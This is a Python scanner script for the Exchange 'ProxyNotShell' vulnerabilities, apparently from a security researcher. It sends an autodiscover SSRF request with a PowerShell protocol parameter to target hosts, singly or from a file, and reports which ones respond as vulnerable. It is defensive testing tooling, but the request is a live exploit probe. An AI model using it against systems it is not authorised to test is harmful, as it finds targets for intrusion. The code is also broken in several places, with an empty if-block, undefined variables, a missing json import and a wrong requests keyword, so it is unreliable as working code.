
#!/usr/bin/env python3
# NotProxyShell Scanner
# 2022 - ZephrFish 

import requests
import argparse
import re

# Colours
def prRed(skk): 
    return "\033[91m {}\033[00m" .format(skk)
def prGreen(skk): 
    return "\033[92m {}\033[00m" .format(skk)
def prCyan(skk): 
    return "\033[96m {}\033[00m" .format(skk)
def prYellow(skk): 
    return "\033[93m {}\033[00m" .format(skk)

def banner():
    print('''
     _   _       _   ____                      ____  _          _ _ 
    | \ | | ___ | |_|  _ \ _ __ _____  ___   _/ ___|| |__   ___| | |
    |  \| |/ _ \| __| |_) | '__/ _ \ \/ / | | \___ \| '_ \ / _ \ | |
    | |\  | (_) | |_|  __/| | | (_) >  <| |_| |___) | | | |  __/ | |
    |_| \_|\___/ \__|_|   |_|  \___/_/\_\\__, |____/|_| |_|\___|_|_|
                                         |___/ 
    Scanner by ZephrFish                                                                         
    ''')
    print('''
    CVE-2022-40140 & CVE-2022-41082 Scanner
    Usage:
            Check Hosts: python3 NotProxy.py -u target_host
            Check List: python3 NotProxy.py -f file.txt
        ''')

# Initial variables

outfile = None
targethost = 'example.com'
email = 'example@example.com'


def scanner(args):
    targethost = args.targethost
    domain = args.targetdomain
    email = args.targetemail
    proxy = {

                "http": "http://127.0.0.1:8080",
                "https": "https://127.0.0.1:8080",
        }
    regex=re.compile('^http://|^https://')
    attack_url = targethost + f'/autodiscover/autodiscover.json?{email}/owa/&Email=autodiscover/autodiscover.json?b@{domain}&Protocol=TESTING&Protocol=PowerShell'
    if re.match(regex, attack_url):
        try:
            response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
            if response.status_code == 200 and 'Powershell' in response.text:
                prGreen("[+] Target {} Vulnerable".format(targethost))
            elif response.status_code == 503 and '' in response.text:
                prRed("[!] Target {} is not Vulnerable".format(targethost))
        
        except Exception as e:
            prYellow('url exception {0}'.format(targethost))





def main(args):
    targethostfile = args.targethostfile
    if targethost == None:
        with open(targethostfile.rstrip(), 'r') as f:
             for target in f:
                scanner(target)
    else: 
        target = targethost 
        attack_url = target + f'/autodiscover/autodiscover.json?{email}/owa/&Email=autodiscover/autodiscover.json?b@{domain}&Protocol=TESTING&Protocol=PowerShell'
        regex=re.compile('^http://|^https://')
        if re.match(regex, target):
            try:
                response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
                if response.status_code == 200 and 'Powershell' in response.text:
            
            except: 
                pass




       try:
        response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            prGreen("[+] Target {} Vulnerable".format(targethost))
            print('[+] Response:{0}'.format(display))
        else:
            prRed("[-] Target {} Not Vulnerable".format(targethost))
    except Exception as e:
        prYellow('url exception {0}'.format(targethost))
    banner()




if __name__ == '__main__':

	parser = argparse.ArgumentParser()

	basic_args = parser.add_argument_group(title='Basic Options')
	basic_args.add_argument('-u', '--targethost', default=None, required=False, help='Single Target host e.g zsec.uk')
	basic_args.add_argument('-f', '--targethostfile', default=None, required=False, help='File with targets, one per line')
    basic_args.add_argument('-e', '--email', default=None, required=False, help='Known email of org')
    basic_args.add_argument('-o', '--outfile', default=None, required=False, help='Output file for log')
    
    args = parser.parse_known_args()
    
    main(args)